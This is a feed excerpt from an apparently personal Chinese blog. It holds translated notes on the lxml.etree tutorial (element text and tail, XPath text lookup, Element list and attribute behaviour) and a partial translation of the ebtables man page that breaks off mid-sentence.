    <content type="html"><![CDATA[<p>原文来源：<code>https://lxml.de/tutorial.html</code></p><p>本文内容：</p><ol><li>元素包含文本</li><li>使用 XPath 查找文本</li></ol><a id="more"></a><h2 id="元素（Elements）可以包含文本（TEXT）"><a href="#元素（Elements）可以包含文本（TEXT）" class="headerlink" title="元素（Elements）可以包含文本（TEXT）"></a>元素（Elements）可以包含文本（TEXT）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; root = etree.Element(&quot;root&quot;)</span><br><span class="line">&gt;&gt;&gt; root.text = &quot;TEXT&quot;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; print(root.text)</span><br><span class="line">TEXT</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; etree.tostring(root)</span><br><span class="line">b&apos;&lt;root&gt;TEXT&lt;/root&gt;&apos;</span><br></pre></td></tr></table></figure><p>在许多XML文档（以数据为中心的文档）中，这里是唯一存在”文本”的地方了。一般文本会被包含在位于树层级的最底层的叶子标签中。</p><p>然而，如果XML被用于向（X）HTML这样的”标签文本文档”，那么”文本(TEXT)”可以在不同的标签之间出现。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;&lt;body&gt;Hello&lt;br/&gt;World&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>这里，<code>&lt;br/&gt;</code> 标签被文本包围了。这就是常说的 <em>文档型</em> 或者 <em>混合内容</em> 的XML。Element 类通过其 <strong>tail</strong> 属性来支持这种写法。tail 属性表示在一颗XML树中，紧跟在一个元素后，另一个不同元素前的文本。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; html = etree.Element(&quot;html&quot;)</span><br><span class="line">&gt;&gt;&gt; body = etree.SubElement(html, &quot;body&quot;)</span><br><span class="line">&gt;&gt;&gt; body.text = &quot;TEXT&quot;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; etree.tostring(html)</span><br><span class="line">b&apos;&lt;html&gt;&lt;body&gt;TEXT&lt;/body&gt;&lt;/html&gt;&apos;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; br = etree.SubElement(body, &quot;br&quot;)</span><br><span class="line">&gt;&gt;&gt; etree.tostring(html)</span><br><span class="line">b&apos;&lt;html&gt;&lt;body&gt;TEXT&lt;br/&gt;&lt;/body&gt;&lt;/html&gt;&apos;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; br.tail = &quot;TAIL&quot;</span><br><span class="line">&gt;&gt;&gt; etree.tostring(html)</span><br><span class="line">b&apos;&lt;html&gt;&lt;body&gt;TEXT&lt;br/&gt;TAIL&lt;/body&gt;&lt;/html&gt;&apos;</span><br></pre></td></tr></table></figure><p><code>.text</code> 和 <code>.tail</code> 两个属性足以在XML文档中表示所有文本内容。这样一来，ElementTree API 就不需要除了 Element 类之外的任何<strong>特殊文本节点</strong>，通常来说这些<strong>特殊节点</strong>是很碍事的（从<strong>DOM</strong> API中也能窥知一二）。</p><p>然而，tail 文本也有它不方便的地方。比如，当你从树中序列化（serialise）一个元素的时候，你可能并不会希望tail里的文本紧随其后（当然你可能会需要它子元素的tail属性里的文本）。为了达到这个目的，<strong>tostring()</strong>方法可以接收一个关键字参数：<em>with_tail</em> (是bool类型)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; etree.tostring(br)</span><br><span class="line">b&apos;&lt;br/&gt;TAIL&apos;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; etree.tostring(br, with_tail=False)#lxml.etree only!</span><br><span class="line">b&apos;&lt;br/&gt;&apos;</span><br></pre></td></tr></table></figure><p>如果你仅仅需要一个XML文档中的所有TEXT（而不需要标签），你可以递归的地拼接所有text和tail属性。再一次的，<strong>tostring()</strong> 方法提供了 <em>method</em> 关键字：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; etree.tostring(html, method=&quot;text&quot;)</span><br><span class="line">b&apos;TEXTTAIL&apos;</span><br></pre></td></tr></table></figure><h2 id="使用-XPath-查找文本"><a href="#使用-XPath-查找文本" class="headerlink" title="使用 XPath 查找文本"></a>使用 XPath 查找文本</h2><p>另一种在树中提取出文本内容的方式是使用 <strong>XPath</strong> ，它甚至可以帮你将连在一起的文本块（text chunks）分开，并存到一个list里：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print(html.xpath(&quot;string()&quot;)) # lxml.etree only!</span><br><span class="line">TEXTTAIL</span><br><span class="line">&gt;&gt;&gt; print(html.xpath(&quot;//text()&quot;)) # lxml.etree only!</span><br><span class="line">[&apos;TEXT&apos;, &apos;TAIL&apos;]</span><br></pre></td></tr></table></figure><p>如果你想经常使用的话，可以将其打包成函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; generate_text_list = etree.XPath(&quot;//text()&quot;) # lxml.etree only!</span><br><span class="line">&gt;&gt;&gt; print generate_text_list(html)</span><br></pre></td></tr></table></figure><p>需要注意，使用XPath返回的字符串结果都是”智能”的对象，他们可以知道自己是属于哪个元素的文本，即知道自己的父亲（源头），通过<strong>getparent()</strong>方法。就像你对 Element 对象操作的那样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; texts = generate_text_list(html)</span><br><span class="line">&gt;&gt;&gt; print(texts[0])</span><br><span class="line">TEXT</span><br><span class="line">&gt;&gt;&gt; parent = texts[0].getparent();;注意这是对一个&quot;字符串&quot;进行的操作哦</span><br><span class="line">&gt;&gt;&gt; print(parent.tag)</span><br><span class="line">body</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; print(texts[1])</span><br><span class="line">TAIL</span><br><span class="line">&gt;&gt;&gt; print(texts[1].getparent().tag)</span><br><span class="line">br</span><br></pre></td></tr></table></figure><p>你也可以通过 <code>is_text</code> 和 <code>is_tail</code> 来判断其是text还是tail</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print(texts[0].is_text)</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; print(texts[1].is_text)</span><br><span class="line">False</span><br><span class="line">&gt;&gt;&gt; print(texts[1].is_tail)</span><br><span class="line">True</span><br></pre></td></tr></table></figure><p>不过虽然这适用于text()函数的结果，但 lxml 是无法告诉您由XPath函数的string()或concat()构造的字符串值的起源（父亲）的:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; stringify = etree.XPath(&quot;string()&quot;)</span><br><span class="line">&gt;&gt;&gt; print(stringify(html))</span><br><span class="line">TEXTTAIL</span><br><span class="line">&gt;&gt;&gt; print(stringify(html).getparent())</span><br><span class="line">None</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;原文来源：&lt;code&gt;https://lxml.de/tutorial.html&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;本文内容：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;元素包含文本&lt;/li&gt;
&lt;li&gt;使用 XPath 查找文本&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>lxml.etree tutorial - part one</title>
    <link href="https://pwn4justice.github.io/2019/06/02/lxml-etree-tutorial-part-one/"/>
    <id>https://pwn4justice.github.io/2019/06/02/lxml-etree-tutorial-part-one/</id>
    <published>2019-06-02T07:50:17.000Z</published>
    <updated>2019-07-30T06:10:16.307Z</updated>
    
    <content type="html"><![CDATA[<p>原文来源：<code>https://lxml.de/tutorial.html</code></p><p>本文目录：</p><ol><li>元素（Element）类</li><li>元素即列表</li><li>元素像字典（dict）那样展现属性</li></ol><a id="more"></a><p><strong>内容：</strong></p><ul><li>Element 类<ul><li>元素集合与列表（list）形式的兼容</li><li>元素像字典（dict）那样展现属性</li><li>元素中包含文本</li><li>使用 XPath 查找文本</li><li>树的迭代</li><li>序列化</li></ul></li><li>ElementTree 类</li><li>从字符串或文件中解析数据<ul><li>fromstring() 方法</li><li>XML() 方法</li><li>解析器对象</li><li>递增解析</li><li>事件驱动的解析</li></ul></li><li>命名空间</li><li>E-factory</li><li>ElementPath （元素路径）</li></ul><p>一个常用的导入 lxml.etree 的方式：<code>from lxml import etree</code></p><p>如果你的代码只使用到了 ElementTree API 的功能而没有用到 lxml.tree 中的任何特有功能，那么你可以使用下面的方法导入 ElementTree 模块：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">  from lxml import etree</span><br><span class="line">  print(&quot;running with lxml.etree&quot;)</span><br><span class="line">except ImportError:</span><br><span class="line">  try:</span><br><span class="line">    # Python 2.5</span><br><span class="line">    import xml.etree.cElementTree as etree</span><br><span class="line">    print(&quot;running with cElementTree on Python 2.5+&quot;)</span><br><span class="line">  except ImportError:</span><br><span class="line">    try:</span><br><span class="line">      # Python 2.5</span><br><span class="line">      import xml.etree.ElementTree as etree</span><br><span class="line">      print(&quot;running with ElementTree on Python 2.5+&quot;)</span><br><span class="line">    except ImportError:</span><br><span class="line">      try:</span><br><span class="line">        # normal cElementTree install</span><br><span class="line">        import cElementTree as etree</span><br><span class="line">        print(&quot;running with cElementTree&quot;)</span><br><span class="line">      except ImportError:</span><br><span class="line">        try:</span><br><span class="line">          # normal ElementTree install</span><br><span class="line">          import elementtree.ElementTree as etree</span><br><span class="line">          print(&quot;running with ElementTree&quot;)</span><br><span class="line">        except ImportError:</span><br><span class="line">          print(&quot;Failed to import ElementTree from any known place&quot;)</span><br></pre></td></tr></table></figure><h3 id="Element-类"><a href="#Element-类" class="headerlink" title="Element 类"></a>Element 类</h3><p> <code>Element</code> 类是 ElementAPI 的主要容器对象，大多数 XML 树功能都可以通过这个类访问。通过<code>Element()</code>可以很容易创建元素：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; root = etree.Element(&apos;root_tag&apos;)</span><br></pre></td></tr></table></figure><p>使用 tag 属性访问XML的标签名称：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print root.tag</span><br><span class="line">root_tag</span><br></pre></td></tr></table></figure><p>元素是用XML树结构组织的，你可以使用 <code>append()</code> 方法来创建一个子元素并添加到父元素：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; root.append( etree.Element(&apos;child1_tag&apos;) )</span><br></pre></td></tr></table></figure><p>然而还有一个更高效的方法来做上面这件事，即使用 <code>SubElement</code> 工厂（此处工厂：factory，意指某个类的初始化方法），但是，该方法需要将“父元素”变量作为它的第一个参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; child2 = etree.SubElement(root, &quot;child2_tag&quot;)</span><br><span class="line">&gt;&gt;&gt; child3 = etree.SubElement(root, &quot;child3_tag&quot;)</span><br></pre></td></tr></table></figure><p>可以通过如下步骤序列化你创建的这棵树，来看见真正的XML效果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print(etree.tostring(root, pretty_print=True))</span><br><span class="line">&lt;root_tag&gt;</span><br><span class="line">  &lt;child1_tag/&gt;</span><br><span class="line">  &lt;child2_tag/&gt;</span><br><span class="line">  &lt;child3_tag/&gt;</span><br><span class="line">&lt;/root_tag&gt;</span><br></pre></td></tr></table></figure><h3 id="元素即列表"><a href="#元素即列表" class="headerlink" title="元素即列表"></a>元素即列表</h3><p>为了更简单和直观的访问子元素，该模块尽可能地模仿了 Python 的 list 的行为，每个元素都像是一个列表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; child = root[0]</span><br><span class="line">&gt;&gt;&gt; print(child.tag)</span><br><span class="line">child1_tag</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; print(len(root))</span><br><span class="line">3</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; root.index(root[1]) # lxml.etree only!</span><br><span class="line">1</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; children = list(root)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; for child in root:</span><br><span class="line">...     print(child.tag)</span><br><span class="line">child1_tag</span><br><span class="line">child2_tag</span><br><span class="line">child3_tag</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; root.insert(0, etree.Element(&quot;child0_tag&quot;))</span><br><span class="line">&gt;&gt;&gt; start = root[:1]//该方法返回列表,尽管列表中只有一个元素!</span><br><span class="line">&gt;&gt;&gt; end   = root[-1:]</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; print(start[0].tag)</span><br><span class="line">child0_tag</span><br><span class="line">&gt;&gt;&gt; print(end[0].tag)</span><br><span class="line">child3_tag</span><br></pre></td></tr></table></figure><p>在 ElementTree 1.3 和 lxml 2.0 之前，你可以通过如下方式查看某个元素是否有子节点，如果有，则为真：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if root:</span><br><span class="line">print &quot;有子节点&quot;</span><br></pre></td></tr></table></figure><p>不过这种方式不支持在未来使用了，应当改用 <code>len(element)</code> 这种方式，才会更少出错：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print(etree.iselement(root))  # 测试是否是 Element</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; if len(root):                 # 测试是否有孩子</span><br><span class="line">...     print(&quot;The root element has children&quot;)</span><br><span class="line">The root element has children</span><br></pre></td></tr></table></figure><p>在 lxml(2.0+) 版本中，Element 的一个特殊的行为表现的和原始的 ElementTree（1.3- 或者 Python 2.7/3.2中）或者 list 不同，即赋值操作 <code>root[0] = root[-1]</code> ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; for c in root:</span><br><span class="line">...     print c</span><br><span class="line">...     print c.tag</span><br><span class="line">... </span><br><span class="line">&lt;Element child0 at 0x102c0c368&gt;</span><br><span class="line">child0</span><br><span class="line">&lt;Element child1 at 0x102c0ce18&gt;</span><br><span class="line">child1</span><br><span class="line">&lt;Element child2 at 0x102c0cea8&gt;</span><br><span class="line">child2</span><br><span class="line">&lt;Element child3 at 0x102c0ce60&gt;</span><br><span class="line">child3</span><br><span class="line">&gt;&gt;&gt; root[0] = root[-1]</span><br><span class="line">&gt;&gt;&gt; for c in root:</span><br><span class="line">...     print c</span><br><span class="line">...     print c.tag</span><br><span class="line">... </span><br><span class="line">&lt;Element child3 at 0x102c0ce60&gt;//注意此处的地址</span><br><span class="line">child3</span><br><span class="line">&lt;Element child1 at 0x102c0ce18&gt;</span><br><span class="line">child1</span><br><span class="line">&lt;Element child2 at 0x102c0cea8&gt;</span><br><span class="line">child2</span><br></pre></td></tr></table></figure><p>而在 list 中的行为是这样的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; l = [0, 1, 2, 3]</span><br><span class="line">&gt;&gt;&gt; l[0] = l[-1]</span><br><span class="line">&gt;&gt;&gt; l</span><br><span class="line">[3, 1, 2, 3]//复制，而不是直接移动</span><br></pre></td></tr></table></figure><p>在早期的 ElementTree 中，Element 对象有着和 list 一样的表现，但是有个缺点就是：当你这样做之后，修改其中一个拥有多份拷贝的 Element 时，其余的也会被修改。</p><p>这个小小的不同有一个好处，就是：用 lxml.tree 创建的 Element 总是只有一个父亲，可以用 <code>getparent()</code> 得到，且这在 ElementTree 中是不被支持的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; root is root[0].getparent()  # lxml.etree only!</span><br><span class="line">True</span><br></pre></td></tr></table></figure><p>那当你只想拷贝时怎么办？凉拌。先用 etree.Element() 创建一个全新的对象，再用Python自带的 copy 模块来复制 :</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; from copy import deepcopy</span><br><span class="line">&gt;&gt;&gt; element = etree.Element(&quot;temproray_store_tags&quot;)</span><br><span class="line">&gt;&gt;&gt; element = append( deepcopy(root[1]) )</span><br><span class="line">&gt;&gt;&gt; print(element[0].tag)</span><br><span class="line">child1_tag</span><br><span class="line">&gt;&gt;&gt; print([ c.tag for c in root ])</span><br><span class="line">[&apos;child3_tag&apos;, &apos;child1_tag&apos;, &apos;child2_tag&apos;]</span><br></pre></td></tr></table></figure><p>兄弟节点可以用 <code>getprevious()</code> 或者 <code>getnext()</code> 反问到：只有在使用 lxml.etree 创建的元素上有效!</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; root[0] is root[1].getprevious() # lxml.etree only!</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; root[1] is root[0].getnext() # lxml.etree only!</span><br><span class="line">True</span><br></pre></td></tr></table></figure><h3 id="元素像字典（dict）那样展现属性"><a href="#元素像字典（dict）那样展现属性" class="headerlink" title="元素像字典（dict）那样展现属性"></a>元素像字典（dict）那样展现属性</h3><p>XML 元素支持属性，可以在Element工厂中直接创建属性：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; root = etree.Element(&quot;root_tag&quot;, interesting=&quot;totally&quot;)</span><br><span class="line">&gt;&gt;&gt; etree.tostring(root)</span><br><span class="line">b&apos;&lt;root interesting=&quot;totally&quot;/&gt;&apos;</span><br></pre></td></tr></table></figure><p>属性只是无序的键值对，所以可以使用类字典的接口来访问他们：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print(root.get(&quot;interesting&quot;))</span><br><span class="line">totally</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; print(root.get(&quot;href&quot;))</span><br><span class="line">None</span><br><span class="line">&gt;&gt;&gt; root.set(&quot;href&quot;, &quot;www.baidu.com&quot;)</span><br><span class="line">&gt;&gt;&gt; print(root.get(&quot;href&quot;))</span><br><span class="line">www.baidu.com</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; etree.tostring(root)</span><br><span class="line">b&apos;&lt;root interesting=&quot;totally&quot; href=&quot;www.baidu.com&quot;/&gt;&apos;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; sorted(root.keys())</span><br><span class="line">[&apos;href&apos;, &apos;interesting&apos;]</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; for name, value in sorted(root.items()):</span><br><span class="line">...     print(&apos;%s = %r&apos; % (name, value))</span><br><span class="line">href = &apos;www.baidu.com&apos;</span><br><span class="line">interesting = &apos;totally&apos;</span><br></pre></td></tr></table></figure><p>如果你想使用类字典的形式来访问属性的话，可以使用 Element 的 <code>attrib</code> 属性：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; attributes = root.attrib//type(attributes) == &lt;type &apos;lxml.etree._Attrib&apos;&gt;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; print(attributes[&quot;interesting&quot;])</span><br><span class="line">totally</span><br><span class="line">&gt;&gt;&gt; print(attributes.get(&quot;src&quot;))</span><br><span class="line">None</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; attributes[&quot;src&quot;] = &quot;source_src&quot;</span><br><span class="line">&gt;&gt;&gt; print(attributes[&quot;src&quot;])</span><br><span class="line">source_src</span><br><span class="line">&gt;&gt;&gt; print(root.get(&quot;src&quot;))</span><br><span class="line">source_src</span><br></pre></td></tr></table></figure><p>注意：attrib 是一个类字典(不是真正的 dict 对象)的对象，这意味着对 Element 的所有改变都会被反应到 attrib 对象上，反之亦然。同时，只要有一个 Element 的 attrib 属性在使用中，那么XML树就会一直存在于内存。不过可以使用一个真正的 dict 对象来保存某个 attrib 对象的一份快照，这是不依赖于XML树的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">d = dict(root.attrib)</span><br><span class="line">&gt;&gt;&gt; sorted(d.items())</span><br><span class="line">[(&apos;href&apos;, &apos;www.baidu.com&apos;), (&apos;interesting&apos;, &apos;totally&apos;)]</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;原文来源：&lt;code&gt;https://lxml.de/tutorial.html&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;本文目录：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;元素（Element）类&lt;/li&gt;
&lt;li&gt;元素即列表&lt;/li&gt;
&lt;li&gt;元素像字典（dict）那样展现属性&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>ebtables 的 Man Page</title>
    <link href="https://pwn4justice.github.io/2019/05/16/ebtables-%E7%9A%84Man-Page/"/>
    <id>https://pwn4justice.github.io/2019/05/16/ebtables-的Man-Page/</id>
    <published>2019-05-16T09:20:13.000Z</published>
    <updated>2019-07-06T17:03:20.333Z</updated>
    
    <content type="html"><![CDATA[<p>以下内容翻译自 ebtables 的 Man 页</p><a id="more"></a><h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><p><strong>ebtables</strong> [<strong>-t</strong> table ] <strong>-</strong>[<strong>ACDI</strong>] chain rule specification [match extensions] [watcher extensions] target<br><strong>ebtables</strong> [<strong>-t</strong> table ] <strong>-P</strong> chain <strong>ACCEPT</strong> | <strong>DROP</strong> | <strong>RETURN</strong><br><strong>ebtables</strong> [<strong>-t</strong> table ] <strong>-F</strong> [chain]<br><strong>ebtables</strong> [<strong>-t</strong> table ] <strong>-Z</strong> [chain]<br><strong>ebtables</strong> [<strong>-t</strong> table ] <strong>-L</strong> [<strong>-Z</strong>] [chain] [ [<strong>–Ln</strong>] | [<strong>–Lx</strong>] ] [<strong>–Lc</strong>] [<strong>–Lmac2</strong>]<br><strong>ebtables</strong> [<strong>-t</strong> table ] <strong>-N</strong> chain [<strong>-P ACCEPT</strong> | <strong>DROP</strong> | <strong>RETURN</strong>]<br><strong>ebtables</strong> [<strong>-t</strong> table ] <strong>-X</strong> [chain]<br><strong>ebtables</strong> [<strong>-t</strong> table ] <strong>-E</strong> old-chain-name new-chain-name<br><strong>ebtables</strong> [<strong>-t</strong> table ] <strong>–init-table</strong><br><strong>ebtables</strong> [<strong>-t</strong> table ] [<strong>–atomic-file</strong> file] <strong>–atomic-commit</strong><br><strong>ebtables</strong> [<strong>-t</strong> table ] [<strong>–atomic-file</strong> file] <strong>–atomic-init</strong><br><strong>ebtables</strong> [<strong>-t</strong> table ] [<strong>–atomic-file</strong> file] <strong>–atomic-save</strong> </p><p>注：-t 如果有，必须第一个写。</p><br><h3 id="表-三张"><a href="#表-三张" class="headerlink" title="表 - 三张"></a>表 - 三张</h3><ul><li>filter - 默认表。<ul><li>内建的链：<strong>INPUT</strong> {帧[在MAC层面上]就是发给网桥的时候[即帧的目的MAC地址就是网桥时]会经过这条链chain } </li><li><strong>OUTPUT</strong> { 适用于本地生成的帧，或者是(b)routed的帧，，，话说routed我知道是路由时IP层下来的，但是brouted是<strong>什么鬼？？</strong>  }</li><li><strong>FORWARD</strong> { 适用于被网桥转发的帧 }</li></ul></li><li>nat - 最常用来改变帧的目的mac地址<ul><li>内建的链：<strong>PREROUTING</strong> { 适用于在帧刚进主机（路由器）的时候 }</li><li><strong>OUTPUT</strong> { for altering locally generated or (b)routed frames before they are bridged }</li><li><strong>POSTROUTING</strong> { 适用于帧马上要离开主机（路由器）的时候 }</li><li>注：PREROUTING and POSTROUTING: it would be more accurate to call them PREFORWARDING and POSTFORWARDING，且你可以使用 -E 选项来将其改名</li></ul></li><li>broute - 经常被用来 make a brouter ???<ul><li>只有一条内建的链：<strong>BROUTING</strong> , 且这个表中的 <strong>DROP</strong> 和 <strong>ACCEPT</strong> 分别表示”让其被路由“和”让其被桥接“</li><li>BROUTING chain 在很早就会被帧拿来做匹配，当然只能运行”流经<strong>转发状态的端口</strong>的帧“来匹配，此处target常用<code>redirect</code></li></ul></li></ul><br><h3 id="CHAINS-若干"><a href="#CHAINS-若干" class="headerlink" title="CHAINS - 若干"></a>CHAINS - 若干</h3><p><strong>理解方式一：</strong></p><p>内核中有三张内嵌有CHAINS的表。三张表按功能划分，每个功能（也就是表）中用该功能相适应的“规则”。每一条规则就是一个chain。</p><p>每一条chain都是一个有特定顺序的“链表”，用来做一次以太网帧的匹配。如果，某个以太网帧匹配到了一条chain，那么就对该帧执行</p><p>这条chain上的 target。如果这个帧没有匹配上这条chain，那么继续匹配下一跳chain，用户可以扩展一条chain（创建chain的第二个</p><p>往后的结点）然后使用 “头结点” 